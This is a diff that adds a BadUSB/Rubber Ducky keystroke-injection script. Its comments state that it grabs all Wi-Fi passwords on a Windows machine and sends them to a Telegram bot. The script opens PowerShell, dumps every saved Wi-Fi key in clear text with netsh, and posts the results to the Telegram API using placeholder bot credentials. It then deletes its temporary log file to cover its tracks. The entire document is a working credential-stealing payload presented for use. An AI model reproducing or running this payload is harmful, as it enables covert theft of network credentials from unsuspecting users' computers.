@@ -1,0 +1,40 @@
+REM send wifi-password-to-telegram-bot-by-powershall-it's-mean-safe
+REM GRABS ALL WIFI PASSWORDS ON WINDOWS AND SENDS THEM TO A TELEGRAM BOT
+DELAY 2000
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 200
+STRING powershell
+ENTER
+DELAY 200
+REM set TELEGRAM bot Token
+STRING $botToken = 'TOKEN_BOT'
+ENTER
+REM set TELEGRAM chatid
+STRING $chatId = 'CHAT_ID'
+ENTER
+STRING $wifiInfo = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | % {(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize
+ENTER
+STRING $wifiInfo | Out-File -FilePath $env:USERPROFILE\Desktop\log.txt
+ENTER
+STRING $url = "https://api.telegram.org/bot$botToken/sendMessage"
+ENTER
+STRING $body = @{
+ENTER
+STRING   chat_id = $chatId
+ENTER
+STRING   text = (Get-Content $env:USERPROFILE\Desktop\log.txt -Raw)
+ENTER
+STRING }
+ENTER
+STRING Invoke-RestMethod -Uri $url -Method Post -Body $body
+ENTER
+STRING del $env:USERPROFILE\Desktop\log.txt
+ENTER
+STRING exit
+ENTER
+DELAY 800
+STRING exit
+ENTER
